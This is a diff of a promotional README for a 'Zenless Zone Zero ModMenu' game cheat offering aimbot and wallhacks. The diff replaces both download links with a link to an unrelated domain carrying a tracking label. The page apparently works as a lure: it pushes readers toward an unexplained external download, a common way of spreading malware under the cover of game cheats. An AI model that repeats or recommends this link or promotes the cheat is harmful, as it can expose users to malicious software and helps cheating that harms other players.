@@ -2,7 +2,7 @@
 
 The **Zenless Zone Zero ModMenu** is the ultimate tool for players looking to enhance their gaming experience by unlocking a wide range of powerful mods. With features like aimbot, ESP (wallhacks), and additional customizations, this mod menu allows you to take control of your gameplay, giving you the upper hand in any situation. Whether you want to explore new possibilities, gain a competitive advantage, or just have fun experimenting with mods, this tool is designed for every player.
 
-[![Download ZZZ ModMenu](https://img.shields.io/badge/Download-ZZZ%20ModMenu-blueviolet)](https://zenless-zone-zero-modmenu.github.io/.github/)
+[![Download ZZZ ModMenu](https://img.shields.io/badge/Download-ZZZ%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## ⚡ Key Features
 
@@ -35,4 +35,4 @@ The **Zenless Zone Zero ModMenu** is the ultimate tool for players looking to en
 4. **Adjust settings** to tailor the mods to your preferences, ensuring smooth and optimal performance.
 5. **Enjoy your enhanced gameplay**, taking advantage of mods that elevate your gaming experience.
 
-[![Download ZZZ ModMenu](https://img.shields.io/badge/Download-ZZZ%20ModMenu-blueviolet)](https://zenless-zone-zero-modmenu.github.io/.github/)
+[![Download ZZZ ModMenu](https://img.shields.io/badge/Download-ZZZ%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
